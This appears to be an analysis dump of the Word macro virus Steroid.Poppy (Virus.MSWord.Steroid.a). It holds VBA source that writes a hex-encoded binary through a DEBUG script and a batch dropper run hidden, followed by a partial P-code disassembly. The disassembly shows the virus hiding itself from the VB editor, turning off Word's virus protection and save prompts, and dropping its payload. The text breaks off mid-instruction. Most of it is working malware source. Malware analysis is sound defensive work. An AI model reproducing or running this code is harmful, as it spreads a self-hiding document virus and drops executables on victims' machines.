Print #hFile, "E 10E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1100 00 10 00 00 0C 00 00 00 13 30 00 00 00 20 00 00"
Print #hFile, "E 1110 D4 00 00 00 63 30 6B 30 85 30 8B 30 8F 30 95 30"
Print #hFile, "E 1120 9B 30 9F 30 A7 30 AE 30 BC 30 C7 30 DA 30 EC 30"
Print #hFile, "E 1130 37 31 56 31 6D 31 75 31 91 31 97 31 D3 31 00 32"
Print #hFile, "E 1140 11 32 1C 32 39 32 47 32 58 32 72 32 83 32 8C 32"
Print #hFile, "E 1150 A2 32 AB 32 C1 32 CF 32 E0 32 EE 32 03 33 0D 33"
Print #hFile, "E 1160 16 33 21 33 2D 33 3A 33 41 33 47 33 4D 33 7A 30"
Print #hFile, "E 1170 66 32 78 32 58 33 5E 33 53 33 6B 33 77 33 7D 33"
Print #hFile, "E 1180 8A 33 96 33 9C 33 A2 33 A8 33 AE 33 B4 33 C3 33"
Print #hFile, "E 1190 D1 33 E2 33 ED 33 56 34 78 34 7E 34 98 34 A6 34"
Print #hFile, "E 11A0 BE 34 FD 33 08 34 0E 34 19 34 23 34 2E 34 34 34"
Print #hFile, "E 11B0 3F 34 45 34 50 34 87 34 08 35 0C 35 10 35 14 35"
Print #hFile, "E 11C0 18 35 1C 35 20 35 24 35 28 35 2C 35 30 35 34 35"
Print #hFile, "E 11D0 38 35 3C 35 40 35 44 35 48 35 4C 35 00 00 00 00"
Print #hFile, "E 11E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 11F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 12F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 13F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 14A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 14B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 14C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 14D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 14E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 14F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 15F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 16A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 16B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 16C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 16D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 16E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 16F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1700 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1710 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 17A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 17B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 17C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 17D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 17E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 17F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 18A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 18B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 18C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 18D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 18E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 18F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 19A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 19B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 19C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 19D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 19E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 19F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1A90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1AA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1AB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1AC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1AD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1AE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1AF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1B90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1BA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1BB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1BC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1BD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1BE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1BF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1C90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1CA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1CB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1CC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1CD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1CE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1CF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1D90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1DA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1DB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1DC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1DD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1DE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1DF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1E90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1EA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1EB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1EC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1ED0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1EF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1F90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1FA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1FB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1FC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1FD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1FE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1FF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 2090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 20A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 20B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 20C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 20D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 20E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 20F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "RCX"
Print #hFile, "2000"
Print #hFile, "W"
Print #hFile, "Q"
Close hFile
End Sub
Sub Anadrol(strFile As String)
ShowVisualBasicEditor = False
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "cd\"
Print #hFile, "debug < start.scr > nul"
Print #hFile, "copy start.com start.exe"
Print #hFile, "del start.com"
Print #hFile, "del start.scr"
Print #hFile, "start"
Print #hFile, "del start.exe"
Print #hFile, "del Anadrol.bat"
Close hFile
Shell ("c:\Anadrol.bat"), vbHide

    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v2.0 Beta
    '====================================================
    'Code Written by VicodinES
    'Poppy ID : 75637833-270   -\/-  Compatable with SR-1
    '
    '           *v2.0 Beta is not in release yet*

End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Steroid.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Injekt - 59925 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub Steroid())
' Line #2:
' Line #3:
' 	QuoteRem 0x0004 0x001B " Steroid.Poppy by VicodinES"
' Line #4:
' 	QuoteRem 0x0004 0x004B " "Whats Up" to : Slage Hammer, Spanska and the entire _Kim_Liberation_Army_"
' Line #5:
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0190 
' 	LitStr 0x0006 "Injekt"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #9:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	DoWhile 
' Line #10:
' 	LitStr 0x000E "c:\startup.log"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Injekt"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #12:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "Injekt"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #13:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #14:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #15:
' 	LitDI2 0x03E2 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #16:
' 	LitStr 0x0005 "%{F4}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #17:
' 	LitStr 0x0002 "%F"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #18:
' 	LitStr 0x0001 "X"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #19:
' 	LitDI2 0x020C 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #20:
' 	LitDI2 0x0055 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #21:
' 	LitDI2 0x0062 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #22:
' 	Loop 
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #25:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #28:
' 	EndWith 
' Line #29:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0190 
' 	LitStr 0x0006 "Injekt"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #32:
' 	Ld Rnd 
' 	LitDI2 0x01A6 
' 	Mul 
' 	FnInt 
' 	St Check 
' Line #33:
' 	Ld Check 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\start.scr"
' 	ArgsCall (Call) Sustanon 0x0001 
' 	EndIf 
' Line #34:
' 	Ld Check 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld System 
